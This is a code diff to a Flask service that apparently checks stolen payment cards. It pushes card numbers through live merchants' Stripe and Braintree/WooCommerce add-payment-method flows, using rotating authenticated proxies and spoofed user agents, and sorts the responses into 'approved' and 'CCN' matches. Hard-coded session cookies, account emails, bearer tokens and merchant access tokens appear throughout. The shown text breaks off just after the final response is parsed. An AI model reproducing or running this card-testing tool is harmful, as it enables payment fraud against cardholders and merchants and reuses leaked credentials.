@@ -1,222 +1,237 @@
-import requests
-import json
 import re
-from flask import Flask, request, jsonify
+import requests
+import random
+import uuid
+from flask import Flask, jsonify
+from bs4 import BeautifulSoup
+import json as json_module
 
-# Initialize Flask App
 app = Flask(__name__)
 
-def process_payment(card_details):
-    """
-    This function contains the core logic from your script.
-    It takes a dictionary of card details and processes the payment.
-    """
-    # --- 1. FIRST REQUEST: GET to add-payment-method page ---
+# List of proxies to rotate
+proxies_list = [
+    {'http': 'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@sg-sin.pvdata.host:8080', 
+     'https': 'http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@sg-sin.pvdata.host:8080'},
+    {'http': 'https://brad:bradhqcc@tits.oops.wtf:6969', 
+     'https': 'https://brad:bradhqcc@tits.oops.wtf:6969'},
+    {'http': 'http://sssssss:sssssssssssssssssssssss@tits.oops.wtf:6969', 
+     'https': 'http://sssssss:sssssssssssssssssssssss@tits.oops.wtf:6969'}
+]
+
+# User agents list
+uaa = [
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 11; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
+]
+
+# Approved patterns
+approved_patterns = [
+    'Nice! New payment method added',
+    'Payment method successfully added.',
+    'Insufficient Funds',
+    'Gateway Rejected: avs',
+    'Duplicate',
+    'Payment method added successfully',
+    'Invalid postal code or street address',
+    'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
+    'succeeded',
+    'setup_intent'
+]
+
+# CCN patterns
+CCN_patterns = [
+    'CVV',
+    'Gateway Rejected: avs_and_cvv',
+    'Card Issuer Declined CVV',
+    'Gateway Rejected: cvv',
+    "Your card's security code is incorrect"
+]
+
+def process_payment(cc, mm, yy, cvv):
     try:
-        cookies = {
-            'sbjs_migrations': '1418474375998%3D1',
-            'sbjs_current_add': 'fd%3D2025-11-28%2016%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fbentleylanecreations.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F',
-            'sbjs_first_add': 'fd%3D2025-11-28%2016%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fbentleylanecreations.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F',
-            'sbjs_current': 'typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-            'sbjs_first': 'typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F142.0.0.0%20Safari%2F537.36',
-            '_ga': 'GA1.1.1002213286.1764349881',
-            'fkcart_cart_qty': '0',
-            'fkcart_cart_total': '%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%26%2336%3B%3C%2Fspan%3E0.00%3C%2Fbdi%3E%3C%2Fspan%3E',
-            '__hstc': '221998599.a2e5bd6399608fed327f4b8dc06dec6e.1764349885082.1764349885082.1764349885082.1',
-            'hubspotutk': 'a2e5bd6399608fed327f4b8dc06dec6e',
-            '__hssrc': '1',
-            '__stripe_mid': '79b6e5ad-5b0c-4134-861c-37e2502c8d2f2b87d2',
-            '__stripe_sid': 'e8c5efcd-2485-4cbb-b49d-50db9cb5f010349908',
-            '_lscache_vary': '685c04f9545210a296c8c6765c584637',
-            'wordpress_logged_in_873cb7bce70a624e4e0ff8ed0a33b1c2': 'malcjaviusstorm%40gmail.com%7C1765559560%7CMB5WprqOzaq05IAaAuiRB0aLFF9DTctDk5UsPhfL23y%7C8b291e94851c72fc19204c6e22a69d844c1845b34ca8caeec74cc7fc6575bb1c',
-            '_ga_14QKZLEYED': 'GS2.1.s1764349881$o1$g0$t1764349962$j55$l0$h0',
-            '_ga_MNDVKEF2BP': 'GS2.1.s1764349881$o1$g1$t1764349966$j56$l0$h0',
-            'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbentleylanecreations.com%2Fmy-account%2Fadd-payment-method%2F',
-            '__hssc': '221998599.2.1764349885082',
-        }
+        # Select random user agent and proxy
+        ua = random.choice(uaa)
+        proxies = random.choice(proxies_list)
+        
+        # Step 1: Tokenize the card with Braintree
         headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
-            'pragma': 'no-cache',
-            'priority': 'u=0, i',
-            'referer': 'https://bentleylanecreations.com/my-account/add-payment-method/',
-            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
-        }
-        requests.get('https://bentleylanecreations.com/my-account/add-payment-method/', cookies=cookies, headers=headers, timeout=30)
-    except Exception:
-        return {"status": "declined", "response": "Your card was declined."}
-
-    # --- 2. SECOND REQUEST: POST to Stripe to create payment method ---
-    try:
-        headers2 = {
-            'accept': 'application/json',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'pragma': 'no-cache',
-            'priority': 'u=1, i',
-            'referer': 'https://js.stripe.com/',
-            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
-        }
-        data2 = f'type=card&card[number]={card_details["card_number"]}&card[cvc]={card_details["cvc"]}&card[exp_year]={card_details["exp_year"]}&card[exp_month]={card_details["exp_month"]}&allow_redisplay=unspecified&billing_details[address][postal_code]={card_details["postal_code"]}&billing_details[address][country]={card_details["country"]}&payment_user_agent=stripe.js%2Fcba9216f35%3B+stripe-js-v3%2Fcba9216f35%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbentleylanecreations.com&time_on_page=1283073&client_attribution_metadata[client_session_id]=4930c9af-0300-48f6-b89d-60782fe69360&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=a6f8ef0f-8e7d-4cbe-84f3-78167f3de01c&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=55c950db-485d-4bbe-8c83-e79cb9bf493df4dc3f&muid=79b6e5ad-5b0c-4134-861c-37e2502c8d2f2b87d2&sid=e8c5efcd-2485-4cbb-b49d-50db9cb5f010349908&key=pk_live_51MuQ36JxXE8UJEXgPLz36wlHls4AV6nvgFtgtKRs7gjnFdsSKf3X4Onv4d8TkUjona7eCoT6uzxTXirEhtzCI4s600qxDdWqul&_stripe_version=2024-06-20'
-        response2 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers2, data=data2, timeout=30)
-        response2_data = response2.json()
-        if 'error' in response2_data or not response2_data.get('id'):
-            return {"status": "declined", "response": "Your card was declined."}
-        payment_method_id = response2_data.get('id', '')
-    except Exception:
-        return {"status": "declined", "response": "Your card was declined."}
-
-    # --- 3. THIRD REQUEST: POST to merchant to create setup intent ---
-    try:
-        cookies3 = {
-            'sbjs_migrations': '1418474375998%3D1',
-            'sbjs_current_add': 'fd%3D2025-11-28%2016%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fbentleylanecreations.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F',
-            'sbjs_first_add': 'fd%3D2025-11-28%2016%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fbentleylanecreations.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F',
-            'sbjs_current': 'typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-            'sbjs_first': 'typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-            '_ga': 'GA1.1.1002213286.1764349881',
-            '__hstc': '221998599.a2e5bd6399608fed327f4b8dc06dec6e.1764349885082.1764349885082.1764349885082.1',
-            'hubspotutk': 'a2e5bd6399608fed327f4b8dc06dec6e',
-            '__hssrc': '1',
-            '__stripe_mid': '79b6e5ad-5b0c-4134-861c-37e2502c8d2f2b87d2',
-            '__stripe_sid': 'e8c5efcd-2485-4cbb-b49d-50db9cb5f010349908',
-            '_lscache_vary': '685c04f9545210a296c8c6765c584637',
-            'wordpress_logged_in_873cb7bce70a624e4e0ff8ed0a33b1c2': 'malcjaviusstorm%40gmail.com%7C1765559560%7CMB5WprqOzaq05IAaAuiRB0aLFF9DTctDk5UsPhfL23y%7C8b291e94851c72fc19204c6e22a69d844c1845b34ca8caeec74cc7fc6575bb1c',
-            '_ga_14QKZLEYED': 'GS2.1.s1764349881$o1$g0$t1764349962$j55$l0$h0',
-            '_ga_MNDVKEF2BP': 'GS2.1.s1764349881$o1$g1$t1764350425$j60$l0$h0',
-            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%206.0%3B%20Nexus%205%20Build%2FMRA58N%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F142.0.0.0%20Mobile%20Safari%2F537.36',
-            'sbjs_session': 'pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbentleylanecreations.com%2Fmy-account%2Fadd-payment-method%2F',
-            '__hssc': '221998599.3.1764349885082',
-        }
-        headers3 = {
             'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://bentleylanecreations.com',
-            'pragma': 'no-cache',
+            'accept-language': 'en-GB',
+            'authorization': 'Bearer eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjQ1NTczMDIsImp0aSI6IjU2MDg3NjQwLTZlMjAtNDNkOC1iMzczLTI5YTYxNDk2ZTVjZSIsInN1YiI6InJqeHpqdG40OWptYzJtbTMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InJqeHpqdG40OWptYzJtbTMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIiwiQnJhaW50cmVlOkFYTyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJsb3ZlZGFnYWlubWVkaWFfaW5zdGFudCIsInBheXBhbF9jbGllbnRfaWQiOiJBZHdOalplLUtkeGZNcEFTc3NhaUNIdV82bWQ2S2lYcXdpQk9tUENmeDJKYm9jYl9IQkI4YVBFTjFrV2tydkpOXzZ2dmJqcFlhQ0w4OWdVMSJ9fQ.PmLOpgapJgaJCikf76abXKw27QRmthrwdZb34iO2AimzNdvgsbc3IJaeqgyrmQBFnq5HbEsPGQx5COsgotI55w',
+            'braintree-version': '2018-05-10',
+            'content-type': 'application/json',
+            'origin': 'https://assets.braintreegateway.com',
             'priority': 'u=1, i',
-            'referer': 'https://bentleylanecreations.com/my-account/add-payment-method/',
-            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
+            'referer': 'https://assets.braintreegateway.com/',
+            'save-data': 'on',
+            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
-            'x-requested-with': 'XMLHttpRequest',
+            'sec-fetch-site': 'cross-site',
+            'user-agent': ua,
         }
-        params3 = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
-        data3 = {
-            'action': 'create_and_confirm_setup_intent',
-            'wc-stripe-payment-method': payment_method_id,
-            'wc-stripe-payment-type': 'card',
-            '_ajax_nonce': 'b7a9cb9881',
-        }
-        response3 = requests.post('https://bentleylanecreations.com/', params=params3, cookies=cookies3, headers=headers3, data=data3, timeout=30)
-        response_data = response3.json()
-        
-        if response_data.get('success') and response_data.get('data', {}).get('status') == 'succeeded':
-            return {"status": "approved", "response": "Payment method added successfully"}
-        
-        setup_intent_id = response_data.get('data', {}).get('id', '')
-        client_secret = response_data.get('data', {}).get('client_secret', '')
-        
-        if not setup_intent_id or not client_secret:
-            return {"status": "declined", "response": "Your card was declined."}
-    except Exception:
-        return {"status": "declined", "response": "Your card was declined."}
 
-    # --- 4. FOURTH REQUEST: POST to Stripe to confirm setup intent ---
-    try:
-        headers4 = {
-            'accept': 'application/json',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'pragma': 'no-cache',
-            'priority': 'u=1, i',
-            'referer': 'https://js.stripe.com/',
-            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
+        json_data = {
+            'clientSdkMetadata': {
+                'source': 'client',
+                'integration': 'dropin2',
+                'sessionId': str(uuid.uuid4()),
+            },
+            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+            'variables': {
+                'input': {
+                    'creditCard': {
+                        'number': cc,
+                        'expirationMonth': mm,
+                        'expirationYear': yy,
+                        'cvv': cvv,
+                        'billingAddress': {
+                            'postalCode': '10001',
+                        },
+                    },
+                    'options': {
+                        'validate': False,
+                    },
+                },
+            },
+            'operationName': 'TokenizeCreditCard',
+        }
+
+        r = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxies)
+        t = r.json()
+        
+        if 'data' not in t or 'tokenizeCreditCard' not in t['data'] or 'token' not in t['data']['tokenizeCreditCard']:
+            return {
+                'status': 'Error',
+                'response': 'Failed to tokenize card'
+            }
+            
+        tok = t['data']['tokenizeCreditCard']['token']
+
+        # Step 2: Submit token to WooCommerce
+        cookies = {
+            '_fbp': 'fb.1.1760784423991.8067735593',
+            'pysAddToCartFragmentId': '',
+            '_ga': 'GA1.1.679663780.1760784425',
+            'pys_advanced_form_data': '{%22first_name%22:%22%22%2C%22last_name%22:%22%22%2C%22email%22:%22xcracker663@gmail.com%22%2C%22phone%22:%22%22%2C%22fns%22:[]%2C%22lns%22:[]%2C%22emails%22:[%22xcracker663@gmail.com%22%2C%22xcragsgwhwh3@gmail.com%22%2C%22xcracker6636263@gmail.com%22]%2C%22phones%22:[]}',
+            '_ga_SKX4MWPJWN': 'GS2.1.s1760784425$o1$g1$t1760784834$j60$l0$h0',
+            'pys_session_limit': 'true',
+            'pys_first_visit': 'true',
+            'pysTrafficSource': 'direct',
+            'pys_landing_page': 'https://lovedagainmedia.com/my-account',
+            'last_pysTrafficSource': 'direct',
+            'groundhogg-lead-source': 'https://lovedagainmedia.com/my-account',
+            'groundhogg-tracking': 'Zk83QVlFUE42S1ZlY1hKc0RFMGZDZHB2enFuSFRCdFkvSlJwYmo1eGxYST0%3D',
+            'breeze_folder_name': 'c3a41d9da7d57477427097787121b1a974371ed3',
+            'wordpress_logged_in_ef622a6d6df3290e271fd50a256d6fba': '38b85d2599b8cf42a1a0d342b%7C1765680437%7CP3gE5ss0KbZnL0QmDsQFpHUY1vHk7NcQRuKnsU9kAC6%7Cf0f6bcdbff1efb563556b422aadeec78c727a50993740aa479d9a79d813cbaf4',
+            'mcfw-wp-user-cookie': 'NjcyODU0fDB8NjN8NjgwX2Q4NGNiNmNiZWViZTQxMTJhZDMzMGU5ZTMyZTYyMThlNGU5NzQzOGVjMWZhY2FjNzk3ZTQ2YjYyZWE0MjZjYWU%3D',
+            '_gcl_au': '1.1.11265940.1760784423.822680999.1764470806.1764470949',
+            'PHPSESSID': '3ftpunkmdsasb40i5vvvt71b2e',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2025-11-30%2002%3A48%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method',
+            'sbjs_first_add': 'fd%3D2025-11-30%2002%3A48%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Mobile%20Safari%2F537.36',
+            'pys_start_session': 'true',
+            'last_pys_landing_page': 'https://lovedagainmedia.com/my-account/payment-methods',
+            'sbjs_session': 'pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method',
+            'groundhogg-page-visits': '[["/my-account/payment-methods",[[1764470890,1],[1764472726,1]]],["/my-account/add-payment-method",[[1764470908,1],[1764470972,1],[1764472738,1]]]]',
+        }
+
+        headers = {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-GB',
+            'Cache-Control': 'max-age=0',
+            'Connection': 'keep-alive',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://lovedagainmedia.com',
+            'Referer': 'https://lovedagainmedia.com/my-account/add-payment-method',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': ua,
+            'save-data': 'on',
+            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
         }
-        data4 = f'use_stripe_sdk=true&mandate_data[customer_acceptance][type]=online&mandate_data[customer_acceptance][online][infer_from_client]=true&key=pk_live_51MuQ36JxXE8UJEXgPLz36wlHls4AV6nvgFtgtKRs7gjnFdsSKf3X4Onv4d8TkUjona7eCoT6uzxTXirEhtzCI4s600qxDdWqul&_stripe_version=2024-06-20&client_attribution_metadata[client_session_id]=4930c9af-0300-48f6-b89d-60782fe69360&client_attribution_metadata[merchant_integration_source]=l1&client_secret={client_secret}'
-        response4 = requests.post(f'https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm', headers=headers4, data=data4, timeout=30)
-        response_json = response4.json()
+
+        data = {
+            'payment_method': 'braintree_cc',
+            'braintree_cc_nonce_key': tok,
+            'braintree_cc_device_data': '{"correlation_id": "' + str(uuid.uuid4()) + '"}',
+            'braintree_cc_3ds_nonce_key': '',
+            'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/rjxzjtn49jmc2mm3/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/rjxzjtn49jmc2mm3"},"merchantId":"rjxzjtn49jmc2mm3","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"rjxzjtn49jmc2mm3","supportedNetworks":["visa","mastercard","amex","discover"]},"fastlane":{"enabled":true,"tokensOnDemand":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Visa","MasterCard","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Loved Again Media","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjQ3MzE5MjEsImp0aSI6ImQ0YzRiN2M4LTlkYzktNGE5NC1hZjE3LWZhNDViYjc5MjE2MSIsInN1YiI6InJqeHpqdG40OWptYzJtbTMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InJqeHpqdG40OWptYzJtbTMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5Il0sIm9wdGlvbnMiOnt9fQ.lg2VxNdXfJPzuMO7M60Lowf9R9kNzax5HuWhXV7iJQSnUN3PC14Uj1f9xg9S9dGpb3kAucPxh9wuFtzSmpplgQ","paypalClientId":"AdwNjZe-KdxfMpASssaiCHu_6md6KiXqwiBOmPCfx2Jbocb_HBB8aPEN1kWkrvJN_6vvbjpYaCL89gU1","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3336777698625192868","accessToken":"access_token$production$rjxzjtn49jmc2mm3$501425b5cb865ff22144901bb5a31794","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"Loved Again Media","clientId":"AdwNjZe-KdxfMpASssaiCHu_6md6KiXqwiBOmPCfx2Jbocb_HBB8aPEN1kWkrvJN_6vvbjpYaCL89gU1","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"lovedagainmedia_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
+            'woocommerce-add-payment-method-nonce': '7faa5c039c',
+            '_wp_http_referer': '/my-account/add-payment-method',
+            'woocommerce_add_payment_method': '1',
+            'apbct__email_id__elementor_form': '',
+            'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJicmFpbnRyZWVfY2Nfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19kZXZpY2VfZGF0YSBicmFpbnRyZWVfY2NfM2RzX25vbmNlX2tleSBicmFpbnRyZWVfY2NfY29uZmlnX2RhdGEgd29vY29tbWVyY2UtYWRkLXBheW1lbnQtbWV0aG9kLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgd29vY29tbWVyY2VfYWRkX3BheW1lbnRfbWV0aG9kIGFwYmN0X19lbWFpbF9pZF9fZWxlbWVudG9yX2Zvcm0iLCJpbnZpc2libGVfZmllbGRzX2NvdW50Ijo4fX0=',
+            'ct_bot_detector_event_token': '39d6ad2a7c6cebe4685f4bd5835a64c4db0d6b262761335b7bbed0dfb690384c',
+        }
+
+        ree = requests.post('https://lovedagainmedia.com/my-account/add-payment-method', cookies=cookies, headers=headers, data=data, proxies=proxies)
         
-        if 'error' in response_json:
-            return {"status": "declined", "response": "Your card was declined."}
-        else:
-            return {"status": "approved", "response": "Payment method added successfully"}
-    except Exception:
-        return {"status": "declined", "response": "Your card was declined."}
+        # Parse response
+        soup = BeautifulSoup(ree.text, 'html.parser')
